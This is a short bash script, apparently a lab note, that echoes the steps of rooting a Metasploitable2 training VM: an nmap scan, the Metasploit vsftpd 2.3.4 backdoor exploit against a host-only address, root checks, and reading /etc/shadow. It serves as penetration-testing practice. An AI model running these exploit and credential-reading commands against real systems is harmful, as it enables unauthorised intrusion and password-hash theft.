#!/bin/bash
# Metasploitable2 → Root par avalon (24/02/2026)

echo "Reconnaissance Nmap - 27 ports TCP"
echo "nmap -sV -p- 192.168.56.3"

echo ""
echo "Exploit VSFTPD backdoor → ROOT"
echo "msfconsole -q -x \""
echo "use exploit/unix/ftp/vsftpd_234_backdoor"
echo "set RHOSTS 192.168.56.3"
echo "set RPORT 21"
echo "exploit\""
echo ""
echo "Post-exploitation ROOT"
echo "whoami → root"
echo "id → uid=0(root) gid=0(root)"
echo "sudo -l → (ALL) ALL"
echo "cat /etc/shadow | grep root"
